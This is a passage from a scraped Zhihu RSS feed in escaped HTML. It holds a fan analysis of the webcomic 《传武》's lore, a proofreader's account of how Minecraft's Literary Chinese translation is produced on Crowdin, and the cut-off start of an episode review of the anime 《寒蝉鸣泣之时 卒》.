src=\"https://pic2.zhimg.com/v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f\" data-watermark-src=\"v2-0b11b47fa2aa5e70b1488606b208b7a9\" data-private-watermark-src=\"\"></p>\n<p>大晋要把超过四分之一的战力安排在雁门关外说明雁门关外的战争不仅仅是我们认识中的北方胡人侵扰的简单缩影，胡人方面其实也有万俟这样更明确的指代了；结合大晋用城隍制度取代了大唐的山神土地制度来看雁门关的战争可能另有隐情；个人猜测和当年山阴抽干鱼山龙脉有关；不知道现在开封天牢外的龙脉是否和鱼山龙脉有关；如果这龙脉是两个王朝之前非此即彼的关系的话，那最后作者的安排其实也能看出更多传承与发展间的取舍（不小心扯远了）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b38028b497124092a674e1b60d2e0211_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"307\" data-watermark=\"watermark\" data-original-src=\"v2-b38028b497124092a674e1b60d2e0211\" data-watermark-src=\"v2-11029d59eca9b550762d4efc59677b75\" data-private-watermark-src=\"\"></p>\n<p><b>3.青龙背负的四大灾星</b></p>\n<p>宁仲背上是所谓的人类面临的四大天灾；目前已经出现的是旱；洪；疫；虽然星云老师并没有设计好，但个人认为最后一个如果要找同等级的还是兵灾更合适一点（历史上兵灾有时也算天灾）；其余如蝗灾的代表飞蝗道人，泥石流的代表石方尊已经在天牢中；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a08166982c9e2ef3e88e8f6bf109f609_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"664\" data-watermark=\"watermark\" data-original-src=\"v2-a08166982c9e2ef3e88e8f6bf109f609\" data-watermark-src=\"v2-b89f7b8af62cb666d01e1be4c49a03a6\" data-private-watermark-src=\"\"></p>\n<p>关于人类对自然灾祸的恐惧，《诗·大雅·云汉》：“旱魃为虐，如惔如焚。”孟子提到：“洚水警余”。至于疫灾的危害，我们今天更是刻骨铭心；在星云老师还提到了如果《传武》的舞台在日本那天灾也免不了类似白胡子的震震果实和核辐射这样的类型；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-24b60a5d1cc23ac08e2e77d6a6bff3b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"498\" data-watermark=\"watermark\" data-original-src=\"v2-24b60a5d1cc23ac08e2e77d6a6bff3b9\" data-watermark-src=\"v2-cd9819948a666ec58a6b8a64c718dcb9\" data-private-watermark-src=\"\"></p>\n<p>在《传武》世界观中天灾被限定为了一百零八种（部分龙套星云老师说不屑取名字），目前在天牢中与宁仲交手的有名有姓的天灾共有二十位：百目道人-百目；异食经-虢也；纸艺人-朱平；奈何手-道去 奈何手； 移山略缺-沈冲；三世神经-三首；活僵-亓官氏；五想欲-释寂悟 ；六度三绝-吾道济 ；蝗中躯-飞蝗道人；小阎王 -罗正；六臂尊者-迦叶；昆仑奴-石方尊；兽王-閺虎；缝尸匠-天残；红妆女-厉鬼；散发鬼；画郎书仙-不笑书生；纸人-朱褶；杨智-双面人；加上之前就提到的白骨洞的白骨精和李存孝；如果再加上山阴的百足等目前出现的天灾，目前应该有约二十五位天灾了；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-510b964bc9ee0968a38c56ca40964a18_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"627\" data-watermark=\"watermark\" data-original-src=\"v2-510b964bc9ee0968a38c56ca40964a18\" data-watermark-src=\"v2-a88b0448dbd623260fffa0d8073cc03d\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的克苏鲁设定</b></h2>\n<p>《传武》中的一大两点就是把传统神话中的旧神和克苏鲁神话中的外神巧妙结合；将原本的一个故事，通过世界观的调整，变成不同风格的多个版本；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cdfc5db79c792872c37c29a54d58f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"233\" data-watermark=\"watermark\" data-original-src=\"v2-cdfc5db79c792872c37c29a54d58f365\" data-watermark-src=\"v2-b66cb765b018264f5ed413653963319e\" data-private-watermark-src=\"\"></p>\n<p><b>1.黄衣之王与他的黄沙眷属</b></p>\n<p>黄衣之王哈斯塔，是克苏鲁神话中不可描述的旧日支配者，是克苏鲁的兄弟，也是克苏鲁的死敌；其实黄衣之王的设定是要早于克苏鲁神话的；罗伯特·W·钱伯斯在1895年出版的《黄衣之王》中就已经创造了这个角色，不过当创作克苏鲁神话的作者洛夫克拉夫特读到了黄衣之王这个设定时，他觉得这个角色简直就是为了克苏鲁世界创造的；于是黄衣之王也成立旧日支配者之一；在克苏鲁神话中，洛夫克拉夫特把他安排成了克苏鲁的死敌；不过在《传武》中他们属于同一阵营；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4f1bbcd53f24d42864725de85ac1f82b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"476\" data-watermark=\"watermark\" data-original-src=\"v2-4f1bbcd53f24d42864725de85ac1f82b\" data-watermark-src=\"v2-9c83fd468473c8c33d3db814d23e0cde\" data-private-watermark-src=\"\"></p>\n<p>理论上黄衣之王哈斯塔的本体被困在金牛座的毕宿五附近，所以他也被称为“深空星海之主”哈斯塔在成为黄衣之王有一个印记，是哈斯塔信徒信仰的来源之一；这个印记可能就是《传武》中道标的原型之一；我个人认为这个道标就是信仰的实体化产物；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-98973b9c29e75a243e7d5e63a84d2861_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-98973b9c29e75a243e7d5e63a84d2861\" data-watermark-src=\"v2-33a9a57e96657500ebfc61204e0e1a9f\" data-private-watermark-src=\"\"></p>\n<p>在《传武》此方世界的黄泉渡口一战中，酆都就因为低估了哈斯塔和他的风之眷族导致难以消灭哈斯塔的有生力量导致此方世界的崩坏，星云老师提到过：外神选择攻陷本土神系的小千世界时，为了对付那些有着不死特质的本土神明；  外神入侵小千世界前需要先拆掉这个世界的底层框架，使世界规则先变为无序；很明显此方世界地狱的崩坏就是这个计划中的第一步；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-08e8df5d15c0f65f7b07d82dc13a4c2c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"801\" data-rawheight=\"454\" data-watermark=\"watermark\" data-original-src=\"v2-08e8df5d15c0f65f7b07d82dc13a4c2c\" data-watermark-src=\"v2-1784c0f66f9104be42d625a554fd9f20\" data-private-watermark-src=\"\"></p>\n<p><b>2.克苏鲁神话外的克苏鲁</b></p>\n<p>在淄州的惧留孙为了实验信仰之力，召唤了外域邪神克苏鲁；克苏鲁是美国小说家霍华德·菲利普·洛夫克拉夫特所创造的克苏鲁神话中的存在，和哈斯塔一样是旧日支配者之一。虽然不是克苏鲁神话中地位最高的，却是最知名的，同时也是克苏鲁神话的形象代表。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-238daf55e8928f4be973e9ddba119783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"859\" data-rawheight=\"411\" data-watermark=\"watermark\" data-original-src=\"v2-238daf55e8928f4be973e9ddba119783\" data-watermark-src=\"v2-3d965a038ed80b080baf312b0300a7b6\" data-private-watermark-src=\"\"></p>\n<p>漫画中除了克苏鲁也同样出现了克苏鲁的眷族深海种；虽然智力不高但是和哈斯塔的风之眷族一样，在《传武》世界中起到提供信仰之力的作用，正是他们源源不断的信仰才使得如克苏鲁这样的神拥有源源不断的法力与生命力；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-575618ae9270b9ec55431bc06b51f277_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"860\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-575618ae9270b9ec55431bc06b51f277\" data-watermark-src=\"v2-fa703d726c592d5a06583e2055b74039\" data-private-watermark-src=\"\"></p>\n<p>在淄州一战中惧留孙通过能力暂时击败了克苏鲁的投影；克苏鲁神话中个体生命的意义更多是只是神明传承的工具，在这场神魔大战中，神明方自己都没有意识到，自己可能也在渐渐转变为这种样子，如果真是这样，那将来即使旧神赢得了战争也可能可能转化为披着传统神明外衣的克苏鲁神；所以这也是为什么凡人不应该把命运交给那些高高在上的神明的原因；（个人观点）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7675a5361ac2400122bfbe423cb69f9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"364\" data-watermark=\"watermark\" data-original-src=\"v2-7675a5361ac2400122bfbe423cb69f9a\" data-watermark-src=\"v2-932befdadf674c3520ae37de4eb8edf6\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的戏剧化设定</b></h2>\n<p><b>1.二百年一轮的庄周梦蝶</b></p>\n<p>两百年前对邪神的感知，开启了秦无阳的传奇一生；其实中国历史上也有一位秦舞阳，他随荆轲入秦刺杀秦始皇；但是历史的记载却很少；这两位秦舞阳都一样是自信且自负的理想主义者；首先从短暂的宏观来看秦舞阳没有错，他处处顾全大局，像极了战乱时期那些追求驱虎吞狼的革命者与战略家；但是神明所化的虎，你把握不住；天道更是一个混乱的不定值；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2f034f967a44561206a95c8274df89d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-2f034f967a44561206a95c8274df89d2\" data-watermark-src=\"v2-655da31f7b70ab91319b1ecb0f44ce3a\" data-private-watermark-src=\"\"></p>\n<p>无论如何漫画中秦舞阳在淄州的黄粱一梦都算是智斗的巅峰；通过梦境共享来做到使敌人自相矛盾；这种想象力和叙事性都是指的肯定的；星云老师说秦舞阳所用的梦境仙法不属于六道中的任何一门，因为梦是这个世界原有的东西；这让我想起黄衣之王哈斯卡在选择黄印宿主时往往会选择通过梦境来进入那人的思维深处，而秦舞阳自认为救苍生的举动也正想是他戏耍严华的黄粱一梦；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-71789f107c5ac9848edb6889d529936d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"550\" data-watermark=\"watermark\" data-original-src=\"v2-71789f107c5ac9848edb6889d529936d\" data-watermark-src=\"v2-240e7f3e5f8b0acfc32c9c29c28755bb\" data-private-watermark-src=\"\"></p>\n<p>这二百余年的舍命追求，到底是求来了神明的施舍；战争的胜利，还是到头来不过是黄粱一梦呢？期待秦舞阳这个山阴灵魂人物的结局，也期待未来有关他和二百年前的故事；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ba450150eb8856f8a4cd4523cc025223_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"983\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-ba450150eb8856f8a4cd4523cc025223\" data-watermark-src=\"v2-c58308fae03d2ad9c6242909a768a5ef\" data-private-watermark-src=\"\"></p>\n<p><b>2.樊家的王之宝库</b></p>\n<p>目前在《传武》此方世界的体系中被星云老师认真为最强的就是生死道的酆都和他的幽都之种；目前已经出现的如恶来和项羽都展现出了碾压天灾级别的战力和操作（李存孝预计也有可能加入幽都大礼包）；而如此强大的生死道其实也不一定全身酆都的个人玩具；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9bea722a6762a46bc0b5285db4e42103_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"770\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-9bea722a6762a46bc0b5285db4e42103\" data-watermark-src=\"v2-86a0030da5067124778bd695a5985509\" data-private-watermark-src=\"\"></p>\n<p>在汉代就有人想到了通过血脉存续来模仿幽都之种的方式，这就是樊之血；还有樊家掌握的绝学百兵演武；星云老师曾说过百兵演武和木吒的三十六天罡刀原理是一样的，区别是三十六天罡刀数量是固定的，而百兵演武中是有当代所有武器的投影；对一个武道强者来说，随时随地有取之不尽的武器是一种很可怕的绝学；武器本身因为长短软硬各有千秋，但是百兵演武可以使各种武器无缝配合，将武器之间CD的降到最小；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-322c97df2a3c79fc363b1b2724b21bc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"295\" data-watermark=\"watermark\" data-original-src=\"v2-322c97df2a3c79fc363b1b2724b21bc4\" data-watermark-src=\"v2-c6e9664c213853a8b9510a8af027f187\" data-private-watermark-src=\"\"></p>\n<p>不过狗血的是，根据星云老师来说，世界上的百兵演武虽然人人可以上手学习，但所用的库是固定的，这就导致理论上，两个强者不可能同时使用百兵演武；不过反过来两个百兵演武的使用者在争抢百兵演武的使用权倒也是十分有意思的设定（不知道这个设定现在还在不在）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-577fc3d168534e0e75f64a8292ea6aea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"817\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-577fc3d168534e0e75f64a8292ea6aea\" data-watermark-src=\"v2-15ccc498348215229dfdeae5d63a005c\" data-private-watermark-src=\"\"></p>\n<p><b>3.六道轮回间的相生相克</b></p>\n<p>在传武的世界有六道：这六道就是传武世界运行的底层逻辑：生死掌道者目前官方公认最强，酆都也是此方唯一没有继承人的红尘仙；奇技掌道者 最早应该是此方的观音，之后是汉代作用（千年宗门嘛）建立上清派的李董，现在的继任者好像是李春；祸殃掌道者目前应该是那个叫花子，传说一切天灾都是起源于他，是追求乱世的道，目前只知道宁仲身上的祸根是他的手笔；鬼神掌道者目前未知  曾协助构建了大唐的山神土地体系和大晋的城隍体系，按照传说应该建立有宗门；王朝掌道者目前未知，应该在大唐建立有宗门，据说他的衍生规则是玉玺，是祸殃道的死对头，喜欢构建统一和平的王朝；万物掌道者 最早应该是和观音一起活动的驺虞后来唐代时期是可以使用特殊水镜的犭婴如三公主，现任是雁门关外的猰貐；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-81cdc5ef98ee62eab1437b72fb0d6446_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-81cdc5ef98ee62eab1437b72fb0d6446\" data-watermark-src=\"v2-3d179beb6800386321d8274708e64fab\" data-private-watermark-src=\"\"></p>\n<p>这六道互相干涉，互相制约，相生相克构建了此方的《传武》世界；《传武》的世界确实是非常缤纷绚烂的，可能开始有一点生涩，但是当你接受了这些基本设定就能够很好的享受这里面的乐趣；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1e65e30c08ed4b7ab95004611c70e227_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-1e65e30c08ed4b7ab95004611c70e227\" data-watermark-src=\"v2-169ae2151285dd842d8bfa5760bc0ca6\" data-private-watermark-src=\"\"></p>\n<p>另外，除了此方世界外，上界的神明其实也是以六位圣人为首的；不知道是否对应大千世界的六道；</p>\n<hr>\n<h2><b>个人感想</b></h2>\n<p>说点自己的想法：传武其实诞生在一个比较特殊的时期，网络漫画慢慢开始正规化，但是读者还没有完全适应网络漫画的阅读习惯；这应该也是早期《传武》剧情节奏问题的原因之一，不过反过来说，很幸运，看到《传武》一直连载到现在；不论从画风上的不断进化还是故事上的不断丰富，都可以看成这一个特殊历史时期的缩影，传武见证了网络漫画进入一个更好的时代；（下图为传武早期海报）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3a6a3afd84ebc745509f746f6ec880c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1195\" data-watermark=\"watermark\" data-original-src=\"v2-3a6a3afd84ebc745509f746f6ec880c4\" data-watermark-src=\"v2-3403f26c2f74711a0d19196b0cde9884\" data-private-watermark-src=\"v2-91d4f3fec6ed63e36141d65f7d99aeac\"></p>\n<p>《传武》正和他故事中的角色一样，是一部不断在成长的漫画；叙事上现在的《传武》不仅敢玩梦中梦这样复杂的套路，还非常善于把不同的场景穿插着推进；作画上《传武》的进步更是有目共睹的；希望《传武》未来也能想如今这样不断的进化成长，也希望这么一部优秀的漫画能被更多人看到；（下图为传武第二部海报）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2f87b8bce90dbe1af9f7df75dde38f55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1745\" data-watermark=\"watermark\" data-original-src=\"v2-2f87b8bce90dbe1af9f7df75dde38f55\" data-watermark-src=\"v2-98bde04621e3c746852bcac3e0ed3b51\" data-private-watermark-src=\"v2-c261ffb13200bdc31cdaf225b90ae3b7\"></p>\n<p><br></p>\n<a href=\"https://zhuanlan.zhihu.com/p/386792682\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-4a266d6d79ceb8f3e1eac1b9e445fd0a_bh.jpg\" data-image-width=\"1118\" data-image-height=\"563\" class=\"internal\">呆呆兽星君：《传武》红尘仙</a><p>感谢您的阅读~<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">21 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/384869484?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价漫画《传武》？</a><br><a href=\"http://www.zhihu.com/question/348999269?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">日式  ACG 作品有哪些常见百试不爽的套路？</a><br>\n","link":"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待游戏《我的世界》（Minecraft）1.17.1 pre2 版本加入了文言文？","date":"2021-07-06 03:00:12","description":"\n<p>大家好，我是Minecraft文言语言的校对员ff98sha。</p>\n<p>前些天Minecraft文言语言上线了，借此机会写个回答和大家说说，Minecraft的翻译到底是个什么流程。关于文言翻译的来龙去脉可以先看看<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/read/cv11957511%3Ffrom%3Dsearch\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">项目创始人的话</a>。</p>\n<h2>语言的增减</h2>\n<p>在Minecraft Java版1.1时代，游戏还只有36种<a href=\"http://link.zhihu.com/?target=https%3A//minecraft.fandom.com/zh/wiki/%25E8%25AF%25AD%25E8%25A8%2580\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">语言</a>，到了1.17.1便增长到了111种。近几年的语言申请是在<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1386\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin上的一个话题/表格</a>中申请的，可以在这上百层楼中看到有许多语言正等候加入游戏。Cuervo在2020年向Mojang提交了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1612\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">文言申请</a>，并在2021年初被通过。因此文言并不特殊，至少和克林贡语比起来（</p>\n<p>语言申请通过之后，Mojang会在这两个项目中开放该语言的翻译。当语言的翻译和校对进度达到一定百分比时，Mojang就会在定期的排查中将此语言加入到游戏中。例如，文言在正式加入游戏时，校对进度为56%。</p>\n<p>因此新语言要正式加入游戏，除了审批外，至少需要翻译和校对2000多个词条（约8000多个单词）。在Crowdin上Mojang开放了140个语言的翻译，但在1.17.1中仅有111个语言。剩下的那些语言中除了尚未上线过的，还有因为长期无人维护（而字符串又在不断增加）导致翻译进度很低，而从游戏中移除的（如这次移除的马恩岛语）。</p>\n<p><b>所以，各位看到的文言语言其实是尚未完工的。</b>在上线之前我们也没有得到任何的通知。于是乎，大家就会各种吐槽某些翻译有问题……</p>\n<p>自从看到b站的某介绍MC文言视频热度飙升，我们就紧急联系了许多up主，他们也在视频里介绍了“文言语言由玩家翻译，尚未完工，轻喷”的情况。不过大多数人还是以为这是Mojang官方整的烂活（</p>\n<p><img src=\"https://pic3.zhimg.com/v2-660a1678869f20a12e08662e87647ddf_720w.jpg?rss\" data-caption=\"然未校者十之有四，請恕其拙。\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"427\" data-watermark=\"watermark\" data-original-src=\"v2-660a1678869f20a12e08662e87647ddf\" data-watermark-src=\"v2-304f578c38ec5da9809e0a3a7f6e68ee\" data-private-watermark-src=\"\"></p>\n<h2>翻译流程</h2>\n<p><b>Minecraft Java版的翻译全由社区完成</b>，其他版本由专门团队完成，在此不做讨论。</p>\n<p>Minecraft所在的翻译平台叫做<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin</a>（<a href=\"http://link.zhihu.com/?target=https%3A//zh.crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中文版</a>），Mojang开设了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft</a>本体和<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft-launcher\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft Launcher</a>两个项目。</p>\n<p>任何人都可以注册一个Crowdin账号，然后申请加入Minecraft项目。申请通过后就可以选择某个语言开始翻译了。</p>\n<p>普通用户的身份是译者，可以翻译词条，也可以对其他用户提交的翻译进行赞和踩。</p>\n<p>翻译后校对员会对译文进行校对。校对员是由Mojang钦定的、有能力管理语言翻译的译者。目前简体中文的校对员是Cuervo和Powup333，文言的校对员是Cuervo和ff98sha。</p>\n<p>对于有大问题/已经核对的翻译，可以在右侧评论区提出一个问题（issue），并自动提醒校对员重新审查。</p>\n<p>有时候可能会看到有两个完全一样的翻译存在，这是因为校对员使用了全局替换功能，替换了所有翻译中的某个字符串。</p>\n<h2>翻译实装</h2>\n<p>在每两个快照发布前，Mojang会将Crowdin平台上的翻译下载后打包进游戏中。在这个过程中，会自动选择已翻译已校对的翻译。<b>对于已翻译未校对的翻译，则会自动选择Crowdin上排序靠前的翻译。翻译会按照得票数多少从高到低排，平票的按照时间顺序，新提交的会排在前面。</b></p>\n<p><b>于是，就导致了并未校对的译名加入游戏。</b>大家看到的半成品文言就充满了译名不统一、质量差、简繁混用、字形不统一等校对过程中需要解决的问题。当年的雷石东也是因为这个原因而出现的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-863fcec1ced8c947a61b20cb7c55d2fc_720w.png?rss\" data-caption=\"我知道你们在找什么\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"668\" data-watermark=\"watermark\" data-original-src=\"v2-863fcec1ced8c947a61b20cb7c55d2fc\" data-watermark-src=\"v2-1f34ce367420136a9e9e7c23b6060819\" data-private-watermark-src=\"v2-ee8dbc913b3023e53562c0780055fe5b\"></p>\n<p>大家会注意到，有时在启动已下载过的版本之前，依旧会从Mojang服务器重新下载游戏资源文件。这大多是翻译文件的更新。一般来说，Mojang会维护最新两个大版本的翻译。这也是为什么你在1.16.5也能看到文言选项。</p>\n<h2>关于翻译组</h2>\n<p><i>独家爆料：文言翻译组内竟没有一个古人！</i></p>\n<p>Minecraft文言的翻译组是2020年2月建立的，直到2021年1月21号文言上线Crowdin，翻译进度还是很惨淡。</p>\n<p>我赶在寒假和几次节假日/周末，在群内组织了多次讨论，确定了一部分词汇的译法，但想赶在1.17发布前完成校对的愿望还是过于美好。直到4月底，翻译进度为98%，校对进度仅为14%。五一假期及之后猛肝了一波，最终在5月中旬，校对进度突破了58%。</p>\n<p>有人推荐我们参考《汉典》等专业书。没错，我们都用到了，纸质和线上的资源。很少有应用或游戏会有文言翻译，所以我们的基本无从借鉴。但我能确定，游戏中已校对的翻译，几乎都能在讨论群里找到几十条关于其的讨论，这些翻译大都是我们尽力考证过争辩后得出的。</p>\n<p><b>我们是普通玩家，但我们真的有用心整活。</b></p>\n<p>如果有古汉语专业的玩家，请速联系我们，不胜荣幸。</p>\n<h2>其他</h2>\n<p>中文Minecraft Wiki积极参与了Minecraft简体中文版本的翻译。其中主要参与者Craft Lawrence、Powup333和Sjjklh有幸被官方赠予印有中国国旗的特殊翻译者披风。同时这三名成员也获得了简体中文版本的校对员资格，并维护简体中文版本的翻译至2018年。</p>\n<p>文言语言使用繁体是为了承古风。</p>\n<p>文言在语言列表的中间是因为其ISO 639-3代码为lzh（Literary Chinese）。</p>\n<p>2021年7月6日发布了1.17.1正式版，我们这周修改了大量问题，新的翻译已实装到此版本，欢迎体验。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-28630ad281f5956da3d632a5e6ee01da_720w.jpg?rss\" data-caption=\"蜜脾块，确信\" data-size=\"normal\" data-rawwidth=\"340\" data-rawheight=\"166\" data-watermark=\"watermark\" data-original-src=\"v2-28630ad281f5956da3d632a5e6ee01da\" data-watermark-src=\"v2-407ec565a6a0ff6f0dab9e5aa6e5a757\" data-private-watermark-src=\"v2-5a520f5c85cef1b9e53be6fbf7006c05\"></p>\n<p>最近一周一直在努力校对词条，并收集玩家的反馈建议。感谢各位玩家的支持与指正，我们会继续整个文化自信的好活。</p>\n<p>对于文言翻译的建议以及加入翻译组的申请，可以评论本回答或私聊我。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ff98sha?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ff98sha</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">60 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/26584294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">微软会不会把 Minecraft 换引擎重制一遍？</a><br><a href=\"http://www.zhihu.com/question/406965213?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">朋友开了我的世界中国版本地联机房并加了些mod，我收到存档后，导入单人显示forge mod什么的?</a><br>\n","link":"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年7月开播的动画《寒蝉鸣泣之时 卒》？","date":"2021-07-05 11:30:09","description":"\n<p>终于等到《卒》了！继续分集评析，一周一更。</p>\n<p>关于《业》的分集解读请看这里：</p>\n<a href=\"https://www.zhihu.com/question/423143915/answer/1513310105\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-c9329c58a0897eeec4285a4ee7605796_bh.jpg\" data-image-width=\"2880\" data-image-height=\"1800\" class=\"internal\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><p><br></p>\n<p>关于《卒》的一些基本认识：《卒》是解题篇，一共十五集，而第一篇的《鬼明篇》是《鬼骗篇》的解答，所以这样子来看前三篇都是对《业》中前三篇的解答，一定程度上也分别对应《解》中的前三篇。顺带一提，鬼明篇的前两话其实是一起放送的，只不过第一话在1号11：30半放送，第二话则是在2号零点开始。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-098eacb3f028b4f8b9c11bde5c0768d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"826\" data-rawheight=\"394\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>7.1 鬼明篇：其一</b></h2>\n<p>• 鬼明篇的开头与鬼骗篇一致，但从一些细节中可以看出，我们观剧的视角发生了翻转，于是本篇中我们是从作为黑幕的沙都子和礼奈的角度来看待整个故事的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-26bcf64e7034552b19e4d497fb0dde0c_720w.jpg?rss\" data-caption=\"在鬼骗篇同款opening sequence之后，追加了沙都子的独白\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" 